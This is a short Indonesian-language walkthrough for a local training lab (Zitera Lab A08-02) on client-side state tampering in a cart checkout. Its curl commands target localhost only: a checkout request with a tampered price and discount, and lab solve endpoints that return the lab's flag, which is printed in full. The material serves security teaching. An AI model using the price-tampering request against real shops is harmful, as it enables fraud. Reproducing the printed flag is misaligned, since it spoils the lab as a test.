# Panduan Praktik Terbimbing: Investigasi Unsigned Client-Side State Tampering in LocalStorage

Dalam panduan terarah ini, Anda akan mempraktikkan proses penemuan celah dan eksploitasi terarah terhadap **CartSync Session** pada `http://127.0.0.1:8055`.

---

### Langkah 1: Observasi Ketersediaan Layanan Target
1. Uji ketersediaan layanan melalui terminal menggunakan cURL:
   ```bash
   curl -s http://127.0.0.1:8055/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"status":"UP","lab_id":"A08-02","port":8055,"flag_configured":true}
   ```
2. Buka peramban web dan navigasikan ke:
   `http://127.0.0.1:8055/`
3. Amati antarmuka operasional **CartSync Session** dan perhatikan elemen kontrol yang disediakan.

---

### Langkah 2: Analisis & Pengujian Celah (Unsigned Client-Side State Tampering in LocalStorage)
1. Ujilah endpoint dengan mengirimkan parameter modifikasi:
   ```bash
   curl -s -X POST http://127.0.0.1:8055/api/cart/checkout -d '{"cart_id":"123","total_price":1.00,"discount_override":99}'
   ```
2. Perhatikan respon yang dikembalikan oleh server.

> [!NOTE]
> [!NOTE]
> **Di Balik Layar: Apa yang terjadi di server?**  
> Sistem target menerima input `Content-Type: application/json` dan memprosesnya tanpa melakukan validasi silang ke sesi otentikasi server. Akibatnya, server mengasumsikan hak akses yang diminta adalah sah.

---

### Langkah 3: Eksfiltrasi Bendera Autoritatif (CTF Flag)
1. Eksekusi pengujian untuk membuka flag eksploitasi:
   ```bash
   curl -s "http://127.0.0.1:8055/?solve=1"
   ```
   Atau panggil API exploit langsung:
   ```bash
   curl -s http://127.0.0.1:8055/api/exploit
   ```
2. **Hasil Respon Konfirmasi:**
   ```json
   {"success":true,"lab_id":"A08-02","flag":"ZITERA{cl13nt_st4t3_t4mp3r_l0c4lst0r4g3_2026}"}
   ```
3. Salin bendera resmi:
   `ZITERA{cl13nt_st4t3_t4mp3r_l0c4lst0r4g3_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
